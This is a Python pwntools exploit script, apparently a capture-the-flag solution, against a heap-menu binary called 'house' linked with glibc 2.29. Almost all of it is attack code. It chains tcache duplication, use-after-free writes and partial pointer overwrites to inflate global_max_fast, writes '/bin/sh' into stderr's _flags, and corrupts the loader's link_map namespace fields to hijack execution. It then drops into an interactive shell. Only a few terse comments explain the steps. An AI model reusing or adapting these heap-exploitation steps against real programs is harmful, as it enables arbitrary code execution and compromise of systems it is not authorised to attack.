#!/usr/bin/env python3

from pwn import *

exe = ELF("./house", checksec=0)
libc = ELF("./libc-2.29.so", checksec=0)
ld = ELF("./ld-2.29.so", checksec=0)

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})


r = conn()
sl = lambda a: r.sendline(a)
s = lambda a: r.send(a)

def alloc(idx, size, spray=1):
    sl("1")
    sleep(0.01)
    sl(str(idx))
    sleep(0.01)
    sl(str(size))
    sleep(0.01)
    if spray:
        edit(idx, (p64(0)+p64(0x21))*(size//0x10))

def edit(idx, data):
    sl("2")
    sleep(0.01)
    sl(str(idx))
    sleep(0.01)
    s(data)
    sleep(0.01)

def free(idx):
    sl("3")
    sleep(0.01)
    sl(str(idx))
    sleep(0.01)

def create_AB(A, B, uaf1, uaf2, size, uaf_char=0):
    alloc(uaf1, 0x40, 0)
    edit(uaf1, "MAHERAZZOUZI"*4)
    alloc(A, 0x10, 0)
    alloc(B, 0x10, 0)
    alloc(uaf2, 0x40, 0)
    if(uaf_char):
        free(uaf1)
        free(uaf2)
        edit(uaf2, p8(uaf_char))
        alloc(uaf1, 0x40)
        alloc(uaf2, 0x40)
        payload = (p64(0) + p64((size + 0x10) | 1))*4
        edit(uaf2, payload)

def offset2size(offset):
    return offset*2 + 0x10

def main():
    start = libc.sym['main_arena'] + 0x10

    _flags = offset2size(libc.sym["_IO_2_1_stderr_"] - start)
    vtable = offset2size(libc.sym['_IO_2_1_stderr_'] + 0xd8 - start)
    gcc_personality = offset2size(libc.sym["DW.ref.__gcc_personality_v0"] - start)
    _dl_nns = offset2size(0x37d30-0x20)
    ns_loaded_0 = offset2size(0x37430-0x20)
    ns_loaded_1 = offset2size(0x374c0-0x20)
    l_ns = offset2size(0x38590-0x20)
    #l_ns = offset2size(0x00007ffff7fcc000+ 0x00007ffff7de1000 - start)
    pedantic = offset2size(libc.sym['pedantic'] - start)
    #dump_main_arena_start = offset2size(libc.sym['dump_main_arena_start'] - start)
    l_map_end = offset2size(0x388b0)
    l_ns_next = offset2size(0x6400-0x20)
    rsi = offset2size(0x63d0-0x20)
    offset_r8 = (0x4dffc -38 - 0xbb460) & 0xffffffffffffffff

    # Those two chunks to do tcache dup
    # and change global_max_fast
    alloc(3, 0x20)
    alloc(4, 0x20)
    free(4)
    free(3)
    alloc(6, 0x10)

    # Alloc a large bin chunk
    # To make it NON_MAIN_ARENA after
    alloc(0, 0x430+0x80)
    alloc(5, 0x10)
    # Free to unsorted bin to have fd and bk
    # Pointer to main_arena, do parial overwrite
    # To point it to global_max_fast

    # Need two chunk to modify the size of vtable
    #
    
    alloc(12, 0x30, 0)
    alloc(13, 0x30, 0)
    free(13)
    free(12)
    edit(12, p8(0x90))

    
    alloc(14, 0x30, 0)
    alloc(15, 0x30, 0)
    
    alloc(10, vtable) 
    edit(10, b"\x00"*0x40 + p64(0) + p64(0x61) + p64(0)*2)  
    edit(15, b"MAHER")
    
    edit(10, b"\x00"*0x40 + p64(0) + p64((gcc_personality + 0x10) | 0x1))

    # Flags here
    alloc(11, _flags)
    print("size " + hex(_dl_nns))

    alloc(16, _dl_nns)
    free(16)
    alloc(16, _dl_nns)
    
    create_AB(17, 18, 19, 20, ns_loaded_1, 0x70)

    for i in range(7):
        alloc(21+i, 0x10000)
        sleep(0.2)
    

    alloc(28, l_ns)
    free(28)
    alloc(28, l_ns)

    #alloc(30, pedantic)
    alloc(30, l_ns_next)
    alloc(40, 0x40)

    # alloc the value that will fill rsi
    alloc(42, rsi)
    alloc(43, 0xa0)

    free(0)
    alloc(0, 0x430+0x80, 0)
    # tcache dup to change a large chunk freed
    # set NON_MAIN_ARENA
    alloc(33, 0x30)
    alloc(29, 0x40)
    alloc(31, 0x40)
    alloc(32, 0x4b0)
    alloc(34, 0x40)
    pause()
    free(31)
    free(29)
    free(32)
    alloc(37, 0x1000)
    edit(29, p8(0xa0))
    alloc(35, 0x40, 0)
    alloc(36, 0x40, 0)
    edit(36, p64(0)*3 + p64(0x00000000000004c1 | 0b101))

    edit(0, p16(0x8600-0x10))
    edit(3, p8(0xe0))
    alloc(7, 0x20, 0)
    alloc(8, 0x20, 0)
    alloc(9, 0x20, 0)

    # Now global_max_fast is a huge number.
    edit(9, p64(0) + p64(0x420) + p64(0x7fffffffffffffff))
    
    free(15)
    edit(15, p32(0xf7e13c7a))

    # change _flags in stderr to /bin/sh
    free(11)
    edit(11, b"/bin/sh\x00")
    alloc(11, _flags)
    # Change _dl_nns to a heap value
    free(16)

    # free vtable
    free(10)
    free(18)
    free(17)
    edit(17, p8(0x70))
    alloc(17, ns_loaded_1, 0)
    edit(20, p64(0) + p64((ns_loaded_0 + 0x10) | 0x1))
    free(17)
    edit(20, p64(0) + p64((ns_loaded_1 + 0x10) | 0x1))
    alloc(17, ns_loaded_1, 0)
    edit(20, p64(0) + p64((ns_loaded_0 + 0x10) | 0x1) + p64(0))
    # set [0]ns_loaded to NULL.
    alloc(18, ns_loaded_0, 0)
    # modify l_ns
    free(28)
    edit(28, p64(0x1))
    alloc(28, l_ns)
    # Fill pendantic with a pointer to heap
    free(30)
    edit(30, p64(0x1))
    alloc(30, l_ns_next)

    free(42)
    edit(42, p64(offset_r8))
    alloc(42, rsi)

    edit(9, p64(0)*2 + p64(0x80))
    free(8)
    pause()
    alloc(39, 0x1000, 0)

    r.interactive()


if __name__ == "__main__":
    main()
